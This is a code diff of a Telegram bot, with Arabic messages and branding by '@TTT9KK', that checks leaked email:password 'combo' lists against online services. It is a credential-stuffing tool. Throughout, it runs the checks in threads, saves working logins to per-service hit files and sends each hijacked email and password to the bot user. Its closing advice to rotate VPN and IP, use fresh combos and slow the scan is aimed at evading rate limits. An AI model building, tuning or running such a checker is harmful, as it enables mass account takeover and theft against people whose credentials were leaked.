@@ -911,7 +911,7 @@ async def button_callback(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await process_combos(query, context, file_path, lines, scan_type)
 
 async def process_combos(query, context, file_path, lines, scan_type):
-    """Process combo list with THREADS for faster checking"""
+    """Process combo list with threading - FIXED VERSION"""
     user_id = query.from_user.id
     
     # Initialize stats
@@ -920,7 +920,6 @@ async def process_combos(query, context, file_path, lines, scan_type):
         "bad": 0,
         "retry": 0,
         "locked": 0,
-        "2fa": 0,
         "processed": 0,
         "total": len(lines),
         "services_found": {}
@@ -933,150 +932,124 @@ async def process_combos(query, context, file_path, lines, scan_type):
     # Status message
     status_msg = await context.bot.send_message(
         chat_id=user_id,
-        text="⏳ جاري الفحص...\n\n💡 سيتم إرسال كل حساب صحيح فوراً!",
+        text="⏳ جاري الفحص...\n\n💡 سيتم إرسال كل حساب صحيح فوراً!\n💎 <b>Created by @TTT9KK</b>",
         parse_mode='HTML'
     )
     
     start_time = time.time()
     stats_lock = threading.Lock()
     
-    # Thread-safe function to process single combo
-    def process_single_combo(line):
+    # Process with threads
+    from concurrent.futures import ThreadPoolExecutor, as_completed
+    
+    def check_single(line):
+        """Check single combo - thread safe"""
         if ':' not in line:
             return None
         
-        parts = line.split(':', 1)
-        email = parts[0].strip()
-        password = parts[1].strip()
-        
-        # Small delay
-        time.sleep(random.uniform(0.3, 0.5))
-        
-        # Check account
-        result = check_account(email, password, user_id)
-        
-        with stats_lock:
-            stats["processed"] += 1
+        try:
+            parts = line.split(':', 1)
+            email = parts[0].strip()
+            password = parts[1].strip()
             
-            if result["status"] == "hit":
-                stats["hit"] += 1
-                
-                # Save hit
-                hit_file = os.path.join(result_dir, "Hits_All.txt")
-                with open(hit_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{email}:{password} | {result['message']}\n")
-                
-                # Save per service
-                for service_name in result["services"].keys():
-                    stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
-                    
-                    service_file = os.path.join(result_dir, services[service_name]["file"])
-                    with open(service_file, 'a', encoding='utf-8') as f:
-                        f.write(f"{email}:{password}\n")
-                
-                return {"type": "hit", "email": email, "password": password, "message": result['message'], "count": stats["hit"]}
-                
-            elif result["status"] == "bad":
-                stats["bad"] += 1
-            elif result["status"] == "locked":
-                stats["locked"] += 1
-            elif result["status"] == "2fa_required":
-                stats["2fa"] += 1
-                stats["hit"] += 1
-                
-                twofa_file = os.path.join(result_dir, "Hits_2FA.txt")
-                with open(twofa_file, 'a', encoding='utf-8') as f:
-                    f.write(f"{email}:{password} | Requires 2FA\n")
-                
-                return {"type": "2fa", "email": email, "password": password, "count": stats["hit"]}
-                
-            elif result["status"] == "retry":
-                stats["retry"] += 1
-        
-        return None
+            # Delay to avoid rate limit
+            time.sleep(random.uniform(0.3, 0.5))
+            
+            # Check account
+            result = check_account(email, password, user_id)
+            
+            return {
+                "email": email,
+                "password": password,
+                "status": result["status"],
+                "message": result["message"],
+                "services": result["services"]
+            }
+        except Exception as e:
+            logger.error(f"Error in check_single: {e}")
+            return None
     
-    # Use ThreadPoolExecutor for parallel processing
-    max_workers = 300  # Number of threads
+    # Start checking with 10 threads
+    results_list = []
     
-    import asyncio
-    from concurrent.futures import ThreadPoolExecutor
-    
-    with ThreadPoolExecutor(max_workers=max_workers) as executor:
+    with ThreadPoolExecutor(max_workers=10) as executor:
         # Submit all tasks
-        futures = []
-        for line in lines:
-            future = executor.submit(process_single_combo, line)
-            futures.append(future)
+        future_to_line = {executor.submit(check_single, line): line for line in lines}
         
-        # Process results as they complete
-        from concurrent.futures import as_completed
-        
-        update_counter = 0
-        for future in as_completed(futures):
+        # Process as they complete
+        for future in as_completed(future_to_line):
             result = future.result()
             
-            # Send hit immediately
             if result:
-                if result["type"] == "hit":
-                    hit_message = f"""
-🎯 <b>حساب صحيح!</b> #{result["count"]}
+                with stats_lock:
+                    stats["processed"] += 1
+                    
+                    if result["status"] == "hit":
+                        stats["hit"] += 1
+                        
+                        # Save hit
+                        hit_file = os.path.join(result_dir, "Hits_All.txt")
+                        with open(hit_file, 'a', encoding='utf-8') as f:
+                            f.write(f"{result['email']}:{result['password']} | {result['message']}\n")
+                        
+                        # Save per service
+                        for service_name in result["services"].keys():
+                            stats["services_found"][service_name] = stats["services_found"].get(service_name, 0) + 1
+                            
+                            service_file = os.path.join(result_dir, services[service_name]["file"])
+                            with open(service_file, 'a', encoding='utf-8') as f:
+                                f.write(f"{result['email']}:{result['password']}\n")
+                        
+                        # Send hit immediately
+                        hit_msg = f"""
+🎯 <b>حساب صحيح!</b> #{stats["hit"]}
 
-📧 <b>Email:</b> <code>{result["email"]}</code>
-🔑 <b>Password:</b> <code>{result["password"]}</code>
+📧 <b>Email:</b> <code>{result['email']}</code>
+🔑 <b>Password:</b> <code>{result['password']}</code>
 
 {result['message']}
 
 💎 <b>Created by @TTT9KK</b>
-                    """
+                        """
+                        
+                        try:
+                            import asyncio
+                            loop = asyncio.new_event_loop()
+                            asyncio.set_event_loop(loop)
+                            loop.run_until_complete(
+                                context.bot.send_message(
+                                    chat_id=user_id,
+                                    text=hit_msg,
+                                    parse_mode='HTML'
+                                )
+                            )
+                            loop.close()
+                        except Exception as e:
+                            logger.error(f"Error sending hit msg: {e}")
                     
-                    try:
-                        await context.bot.send_message(
-                            chat_id=user_id,
-                            text=hit_message,
-                            parse_mode='HTML'
-                        )
-                    except Exception as e:
-                        logger.error(f"Error sending hit: {e}")
-                
-                elif result["type"] == "2fa":
-                    twofa_message = f"""
-🔐 <b>حساب صحيح - 2FA!</b> #{result["count"]}
-
-📧 <b>Email:</b> <code>{result["email"]}</code>
-🔑 <b>Password:</b> <code>{result["password"]}</code>
-
-⚠️ يحتاج تأكيد ثنائي (2FA)
-
-💎 <b>Created by @TTT9KK</b>
-                    """
+                    elif result["status"] == "bad":
+                        stats["bad"] += 1
+                    elif result["status"] == "locked":
+                        stats["locked"] += 1
+                    elif result["status"] == "retry":
+                        stats["retry"] += 1
                     
-                    try:
-                        await context.bot.send_message(
-                            chat_id=user_id,
-                            text=twofa_message,
-                            parse_mode='HTML'
-                        )
-                    except Exception as e:
-                        logger.error(f"Error sending 2FA hit: {e}")
-            
-            # Update progress every 10 checks
-            update_counter += 1
-            if update_counter % 10 == 0 or stats["processed"] >= stats["total"]:
-                progress = (stats["processed"] / stats["total"]) * 100
-                
-                # Calculate time
-                elapsed = time.time() - start_time
-                if stats["processed"] > 0:
-                    avg_time = elapsed / stats["processed"]
-                    remaining = (stats["total"] - stats["processed"]) * avg_time
-                    eta_minutes = int(remaining / 60)
-                    eta_seconds = int(remaining % 60)
-                    eta_text = f"\n⏱️ المتبقي: ~{eta_minutes}د {eta_seconds}ث"
-                else:
-                    eta_text = ""
-                
-                progress_text = f"""
-⏳ <b>جاري الفحص بـ {max_workers} ثريدات...</b>
+                    # Update progress every 10
+                    if stats["processed"] % 10 == 0 or stats["processed"] >= stats["total"]:
+                        progress = (stats["processed"] / stats["total"]) * 100
+                        
+                        elapsed = time.time() - start_time
+                        if stats["processed"] > 0:
+                            avg_time = elapsed / stats["processed"]
+                            remaining = (stats["total"] - stats["processed"]) * avg_time
+                            eta_min = int(remaining / 60)
+                            eta_sec = int(remaining % 60)
+                            eta_text = f"\n⏱️ المتبقي: ~{eta_min}د {eta_sec}ث"
+                        else:
+                            eta_text = ""
+                        
+                        progress_text = f"""
+⏳ <b>جاري الفحص بـ 10 ثريدات...</b>
 
 📊 التقدم: {stats["processed"]}/{stats["total"]} ({progress:.1f}%)
 {eta_text}
@@ -1084,17 +1057,21 @@ async def process_combos(query, context, file_path, lines, scan_type):
 ✅ صحيح: {stats["hit"]}
 ❌ خاطئ: {stats["bad"]}
 🔒 مقفل: {stats["locked"]}
-🔐 2FA: {stats["2fa"]}
 🔄 إعادة: {stats["retry"]}
 
-💡 يتم إرسال كل حساب صحيح فوراً!
 💎 <b>Created by @TTT9KK</b>
-                """
-                
-                try:
-                    await status_msg.edit_text(progress_text, parse_mode='HTML')
-                except:
-                    pass
+                        """
+                        
+                        try:
+                            import asyncio
+                            loop = asyncio.new_event_loop()
+                            asyncio.set_event_loop(loop)
+                            loop.run_until_complete(
+                                status_msg.edit_text(progress_text, parse_mode='HTML')
+                            )
+                            loop.close()
+                        except:
+                            pass
     
     # Final results
     final_text = f"""
@@ -1105,7 +1082,6 @@ async def process_combos(query, context, file_path, lines, scan_type):
 • صحيح: {stats["hit"]}
 • خاطئ: {stats["bad"]}
 • مقفل: {stats["locked"]}
-• 2FA: {stats["2fa"]}
 • إعادة: {stats["retry"]}
 
 🎯 <b>الخدمات: {len(stats["services_found"])}</b>
@@ -1121,7 +1097,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
     
     await status_msg.edit_text(final_text, parse_mode='HTML')
     
-    # Send result files if any hits
+    # Send files
     if stats["hit"] > 0:
         await context.bot.send_message(
             chat_id=user_id,
@@ -1143,7 +1119,6 @@ async def process_combos(query, context, file_path, lines, scan_type):
             except Exception as e:
                 logger.error(f"Error sending file: {e}")
     else:
-        # No hits found
         await context.bot.send_message(
             chat_id=user_id,
             text=f"""
@@ -1157,7 +1132,7 @@ async def process_combos(query, context, file_path, lines, scan_type):
 🔧 <b>جرب:</b>
 1. استخدم VPN وغيّر IP
 2. جرب كومبو جديد (أقل من شهر)
-3. استخدم quick_tester.py لاختبار الكومبو
+3. قلل سرعة الفحص
 
 💎 <b>Created by @TTT9KK</b>
 📢 <b>Channel:</b> {TELEGRAM_CHANNEL}
